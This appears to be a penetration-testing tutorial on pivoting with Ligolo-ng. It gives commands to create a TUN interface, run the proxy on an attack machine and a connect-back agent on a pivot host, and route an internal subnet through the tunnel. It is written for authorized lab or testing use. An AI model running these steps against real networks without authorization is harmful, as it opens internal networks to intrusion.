# Pivoting with Ligolo-ng

Ligolo-ng creates a TUN-based tunnel that lets the attack machine route traffic through a reachable target and into an otherwise inaccessible internal network. The proxy runs on the attack machine, while the agent runs on the pivot host.

> [!WARNING]
> Use tunneling and routing only in environments where you have explicit authorization. Adding routes can affect how your machine reaches other networks, so verify the subnet before applying it.

## 1. Create the TUN Interface

Remove an old `ligolo` interface if one already exists:

```bash
 sudo ip link delete ligolo 2>/dev/null
```

Create a new TUN interface owned by the current user, then bring it up:

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

The TUN interface is the local endpoint through which the attack machine sends packets destined for the internal network.

## 2. Start the Proxy on the Attack Machine

Run this command in the directory containing the Ligolo-ng proxy:

```bash
sudo ./proxy -selfcert
```

`-selfcert` makes the proxy generate and use a self-signed TLS certificate. Because the agent command below uses `-ignore-cert`, this setup is convenient for an authorized lab but does not authenticate the proxy's certificate.

## 3. Start the Agent on the Pivot Host

If an old agent process is still running in the background, stop it first:

```bash
pkill agent 2>/dev/null
```

Connect the agent to the proxy:

```bash
./agent -connect OUR_IP:11601 -ignore-cert -retry
```

Replace `OUR_IP` with an address of the attack machine that the pivot host can reach.

- `-connect OUR_IP:11601` tells the agent where the proxy is listening.
- `-ignore-cert` accepts the proxy's self-signed certificate.
- `-retry` makes the agent reconnect if the connection drops.

Once the agent connects, select its session in the proxy console and start the tunnel.

## 4. Route the Internal Network Through Ligolo

On the attack machine, add or replace the route for the internal subnet:

```bash
sudo ip route replace Internal_IP/24 dev ligolo
```

Replace `Internal_IP/24` with the actual internal network in CIDR notation. For example, if the internal hosts use addresses such as `192.168.98.2`, `192.168.98.30`, and `192.168.98.120`, the routed subnet would normally be `192.168.98.0/24`.

`ip route replace` is useful because it creates the route when absent and replaces an existing route for the same destination when necessary.

## 5. Verify the Route

Check which interface Linux will use for the internal targets:

```bash
ip route get 192.168.98.2
ip route get 192.168.98.30
ip route get 192.168.98.120
```

The output should show that traffic to each target is sent through the `ligolo` interface. This verifies local routing; it does not by itself prove that the remote service is alive or that a firewall permits the connection.

## Traffic Flow

The completed path is:

1. A tool on the attack machine sends traffic toward an internal IP.
2. The route directs that traffic into the local `ligolo` TUN interface.
3. The Ligolo proxy passes it through the connected agent.
4. The pivot host sends the traffic into the internal network from its own network position.

## Common Problems

- **The agent cannot connect:** confirm that `OUR_IP` is reachable from the pivot host and that TCP port `11601` is not blocked.
- **The agent connects but internal hosts are unreachable:** confirm that the correct agent session and tunnel are active in the proxy console.
- **Traffic uses the wrong interface:** inspect the route with `ip route get <INTERNAL_IP>` and verify that the subnet was entered correctly.
- **The connection drops after sleep or a network change:** restart the proxy or agent as needed; the agent's `-retry` option handles temporary disconnects while it remains running.
- **A route already exists:** `ip route replace` should update it, but first check that replacing the route will not disrupt another active VPN or lab network.
